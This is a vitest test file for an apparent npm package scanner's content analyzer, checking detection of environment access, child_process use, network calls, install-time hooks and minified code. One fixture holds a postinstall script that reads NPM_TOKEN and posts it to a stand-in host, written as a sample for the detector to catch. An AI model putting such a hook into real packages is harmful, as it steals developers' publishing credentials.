import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { analyzeContent } from "../src/analyze/content.js";

let dir: string;

async function fixture(files: Record<string, string>): Promise<string> {
  dir = await mkdtemp(path.join(tmpdir(), "targate-test-"));
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel);
    await mkdir(path.dirname(full), { recursive: true });
    await writeFile(full, content);
  }
  return dir;
}

afterEach(async () => {
  if (dir) await rm(dir, { recursive: true, force: true });
});

describe("analyzeContent", () => {
  it("finds nothing suspicious in clean code", async () => {
    const pkg = await fixture({
      "index.js": "export function add(a, b) { return a + b; }\n",
    });
    const findings = await analyzeContent(pkg, {});
    expect(findings.hasProcessEnvAccess).toBe(false);
    expect(findings.hasChildProcessUsage).toBe(false);
    expect(findings.hasNetworkCalls).toBe(false);
    expect(findings.suspiciousFiles).toEqual([]);
  });

  it("detects env access, child_process and network usage", async () => {
    const pkg = await fixture({
      "scripts/setup.js": `
        const { exec } = require('child_process');
        const token = process.env.NPM_TOKEN;
        fetch('https://collector.example/log', { method: 'POST', body: token });
      `,
    });
    const findings = await analyzeContent(pkg, {
      postinstall: "node scripts/setup.js",
    });
    expect(findings.hasProcessEnvAccess).toBe(true);
    expect(findings.hasChildProcessUsage).toBe(true);
    expect(findings.hasNetworkCalls).toBe(true);
    // The file is referenced by the postinstall script → install-time finding
    expect(findings.installTimeFindings.length).toBeGreaterThan(0);
    expect(findings.installTimeFindings[0]).toContain("scripts/setup.js");
  });

  it("does not report install-time findings for unreferenced files", async () => {
    const pkg = await fixture({
      "lib/runtime.js": "const key = process.env.API_KEY;\n",
    });
    const findings = await analyzeContent(pkg, {});
    expect(findings.hasProcessEnvAccess).toBe(true);
    expect(findings.installTimeFindings).toEqual([]);
  });

  it("detects minified code", async () => {
    const minified = "var a=" + "x".repeat(6000) + ";";
    const pkg = await fixture({ "dist/bundle.min.js": minified });
    const findings = await analyzeContent(pkg, {});
    expect(findings.hasMinifiedCode).toBe(true);
  });
});
